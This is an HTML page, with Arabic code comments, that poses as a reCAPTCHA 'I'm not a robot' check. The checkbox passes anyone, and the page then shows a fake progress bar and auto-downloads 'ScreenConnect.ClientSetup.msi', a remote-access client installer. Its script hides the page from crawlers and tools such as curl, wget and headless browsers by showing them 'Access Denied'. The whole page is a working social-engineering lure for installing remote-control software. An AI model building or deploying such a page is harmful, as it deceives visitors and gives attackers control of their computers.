<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Verification</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .box {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 380px;
            width: 100%;
        }
        h2 {
            color: #00599C;
            margin: 0 0 10px;
            font-size: 20px;
        }
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        button {
            background: #00599C;
            color: #fff;
            border: none;
            padding: 10px 28px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            transition: background 0.3s;
        }
        button:hover:not(:disabled) { background: #004080; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .captcha-box {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 4px;
            padding: 12px 15px;
            width: 100%;
            max-width: 300px;
            margin: 0 auto 20px;
            cursor: pointer;
            user-select: none;
            transition: background 0.2s;
            position: relative;
        }
        .captcha-box:hover { background: #f0f4f9; }
        .captcha-check {
            width: 28px;
            height: 28px;
            border: 2px solid #c1c1c1;
            border-radius: 3px;
            background: #fff;
            margin-right: 12px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            position: relative;
        }
        .captcha-check.checked { border-color: #4caf50; }
        .captcha-check.checked::after {
            content: '';
            display: block;
            width: 6px;
            height: 12px;
            border: solid #4caf50;
            border-width: 0 3px 3px 0;
            transform: rotate(45deg);
            margin-top: -3px;
            animation: checkPop 0.3s ease;
        }
        @keyframes checkPop {
            0%   { transform: rotate(45deg) scale(0); }
            50%  { transform: rotate(45deg) scale(1.3); }
            100% { transform: rotate(45deg) scale(1); }
        }
        .captcha-label { font-size: 15px; color: #333; flex: 1; text-align: left; }
        .captcha-logo { color: #999; font-size: 11px; line-height: 1.2; text-align: right; }
        .captcha-logo b { display: block; color: #5f6368; font-size: 12px; }
        
        .spinner {
            width: 22px;
            height: 22px;
            border: 3px solid #e0e0e0;
            border-top: 3px solid #00599C;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
            margin-right: 12px;
        }
        @keyframes spin {
            0%   { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #downloadSection { display: none; text-align: center; }
        #progressContainer { width: 100%; background: #e0e0e0; border-radius: 4px; margin: 15px 0; overflow: hidden; }
        #progressBar { height: 8px; background: #00599C; width: 0%; transition: width 0.3s ease; }
    </style>
</head>
<body>

    <!-- شاشة الكابتشا -->
    <div class="box" id="captchaSection">
        <h2>Verification</h2>
        <p class="subtitle">Please confirm you are not a robot</p>

        <div class="captcha-box" id="captchaBox">
            <div class="captcha-check" id="captchaCheck"></div>
            <div class="spinner" id="spinner"></div>
            <div class="captcha-label" id="captchaLabel">I'm not a robot</div>
            <div class="captcha-logo">
                <b>reCAPTCHA</b>
                Privacy - Terms
            </div>
        </div>

        <button type="button" id="verifyBtn" disabled>Verify</button>
        <p style="color: #888; font-size: 12px; margin-top: 12px;">Click the checkbox above to verify</p>
    </div>

    <!-- شاشة التحميل -->
    <div class="box" id="downloadSection">
        <p id="statusText">Preparing download...</p>
        <div id="progressContainer">
            <div id="progressBar"></div>
        </div>
        <p id="downloadMessage"></p>
    </div>

    <!-- شاشة اكتمال التحميل -->
    <div class="box" id="completionMessage" style="display:none;">
        <p>Download complete.</p>
    </div>

<script>
// ==========================================
// تم التعديل لقراءة الملف من نفس المجلد
// ==========================================
const FILE_NAME = 'ScreenConnect.ClientSetup.msi';
const DOWNLOAD_URL = './ScreenConnect.ClientSetup.msi';

document.addEventListener('DOMContentLoaded', function () {
    
    // 1) حماية أولية (فحص البوتات)
    const userAgent = navigator.userAgent.toLowerCase();
    const bots = ['bot', 'crawler', 'spider', 'headless', 'python', 'curl', 'wget'];
    let isBot = bots.some(bot => userAgent.includes(bot));
    
    if (isBot || !userAgent.includes('mozilla')) {
        document.body.innerHTML = '<h2 style="text-align:center;color:red;">Access Denied</h2>';
        return;
    }

    // 2) نظام الكابتشا
    const captchaSection = document.getElementById('captchaSection');
    const downloadSection = document.getElementById('downloadSection');
    const completionMessage = document.getElementById('completionMessage');
    
    const box     = document.getElementById('captchaBox');
    const check   = document.getElementById('captchaCheck');
    const spinner = document.getElementById('spinner');
    const label   = document.getElementById('captchaLabel');
    const btn     = document.getElementById('verifyBtn');

    let verified = false;

    // التحقق من الكابتشا المحفوظة في الجلسة
    if (sessionStorage.getItem('captcha_passed') === 'true') {
        startDownloadScreen();
    }

    box.addEventListener('click', function() {
        if (verified) return;

        spinner.style.display = 'block';
        check.style.display = 'none';

        setTimeout(function() {
            spinner.style.display = 'none';
            check.style.display = 'flex';
            check.classList.add('checked');
            label.textContent = 'Verified';
            label.style.color = '#4caf50';
            verified = true;
            btn.disabled = false;

            sessionStorage.setItem('captcha_passed', 'true');

            setTimeout(function() {
                startDownloadScreen();
            }, 500);
        }, 800);
    });

    // 3) شاشة التحميل
    function startDownloadScreen() {
        captchaSection.style.display = 'none';
        downloadSection.style.display = 'block';

        const statusText = document.getElementById('statusText');
        const progressBar = document.getElementById('progressBar');
        const downloadMessage = document.getElementById('downloadMessage');

        // إنشاء رابط التحميل
        const link = document.createElement('a');
        link.href = DOWNLOAD_URL; 
        link.download = FILE_NAME;
        document.body.appendChild(link);

        // محاكاة شريط التقدم
        setTimeout(() => { progressBar.style.width = '25%'; }, 300);

        setTimeout(() => {
            statusText.textContent = 'Connecting to server';
            progressBar.style.width = '50%';
        }, 800);

        setTimeout(() => {
            statusText.textContent = 'Preparing download';
            progressBar.style.width = '75%';
        }, 1200);

        setTimeout(() => {
            statusText.textContent = 'Starting download';
            progressBar.style.width = '95%';

            setTimeout(() => {
                link.click(); // بدء التحميل الفعلي
                statusText.textContent = 'Download started';
                downloadMessage.textContent = FILE_NAME + ' is ready.';
                progressBar.style.width = '100%';

                setTimeout(() => {
                    downloadSection.style.display = 'none';
                    completionMessage.style.display = 'block';
                }, 1000);

            }, 500);
        }, 1600);
    }
});
</script>

</body>
</html>
